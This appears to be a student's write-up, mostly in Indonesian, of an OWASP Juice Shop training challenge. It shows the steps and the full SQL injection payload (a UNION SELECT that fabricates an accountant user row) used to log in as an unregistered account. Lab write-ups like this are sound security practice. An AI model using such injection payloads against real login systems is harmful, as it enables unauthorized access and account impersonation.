Log in with the (non-existing) accountant acc0unt4nt@juice-sh.op without ever registering that user.
https://juice-shop.herokuapp.com/#/score-board?categories=Injection 

Hal-hal yang dilakukan: 
1. Mencoba login untuk melihat bagaimana cara login ke server
2. Dan didapat 
{
  "email": "' and true--",
  "password": "123"
}
3. Membuat sebuah payload yang seakan-akan email itu ada dengan menggunakan UNION select 
4. Dengan payload seperti ini untuk bagian email "email": "' UNION SELECT * FROM (SELECT 20 AS `id`, 'acc0unt4nt@juice-sh.op' AS `username`, 'acc0unt4nt@juice-sh.op' AS `email`, 'test1234' AS `password`, 'accounting' AS `role`, '123' AS `deluxeToken`, '1.2.3.4' AS `lastLoginIp`, '/assets/public/images/uploads/default.svg' AS `profileImage`, '' AS `totpSecret`, 1 AS `isActive`, 12983283 AS `createdAt`, 133424 AS `updatedAt`, NULL AS `deletedAt`) AS tmp WHERE '1'='1';--",
5. Dengan password bebas maka kita akan berhasil masuk ke acc0unt4nt@juice-sh.op tanpa harus registrasi 

Bukti 
![alt text](assets/Ephemeral.png)

![alt text](assets/Ephemeral%202.png)


#### Berhasil